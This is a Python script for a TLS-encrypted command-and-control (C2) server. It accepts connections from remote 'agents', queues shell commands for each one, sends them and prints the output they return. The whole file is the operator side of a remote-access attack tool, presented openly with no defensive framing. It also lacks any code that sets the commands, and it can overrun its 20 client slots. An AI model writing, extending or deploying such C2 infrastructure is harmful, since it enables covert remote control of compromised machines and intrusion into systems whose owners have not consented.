import threading
import socket
import time
import ssl   # 🔐 TLS

# Server Configuration
ip_address = '127.0.0.1'
port_number = 1234
THREADS = []
IPS = []
CMD_INPUT = []
CMD_OUTPUT = []

# Predefine slots for 20 clients
for _ in range(20):
    CMD_INPUT.append('')
    CMD_OUTPUT.append('')
    IPS.append('')

# Function to handle a client
def handle_connection(connection, address, thread_index):
    IPS[thread_index] = address[0]

    print(f"[+] Agent {thread_index + 1} connected from {address}")

    try:
        while True:
            while CMD_INPUT[thread_index] == '':
                time.sleep(1)

            command = CMD_INPUT[thread_index]
            CMD_INPUT[thread_index] = ''

            print(f"[*] Sending command to Agent {thread_index + 1}: {command}")
            connection.sendall(command.encode())

            output = connection.recv(4096).decode()
            CMD_OUTPUT[thread_index] = output
            print(f"[+] Output from Agent {thread_index + 1}: {output}")

    except (ConnectionResetError, BrokenPipeError):
        print(f"[-] Connection lost with Agent {thread_index + 1}")

    finally:
        IPS[thread_index] = ''
        CMD_INPUT[thread_index] = ''
        CMD_OUTPUT[thread_index] = ''
        connection.close()


# Start server (TLS-enabled)
def start_server():
    # 🔐 TLS context
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")

    raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    raw_socket.bind((ip_address, port_number))
    raw_socket.listen(5)

    print(f"[+] Secure C2 Server listening on {ip_address}:{port_number} (TLS enabled)")

    while True:
        client_socket, address = raw_socket.accept()

        try:
            # 🔐 Wrap socket with TLS
            secure_socket = context.wrap_socket(
                client_socket,
                server_side=True
            )
        except ssl.SSLError as e:
            print(f"[-] TLS handshake failed: {e}")
            client_socket.close()
            continue

        thread_index = len(THREADS)

        t = threading.Thread(
            target=handle_connection,
            args=(secure_socket, address, thread_index),
            daemon=True
        )
        THREADS.append(t)
        t.start()


if __name__ == "__main__":
    start_server()

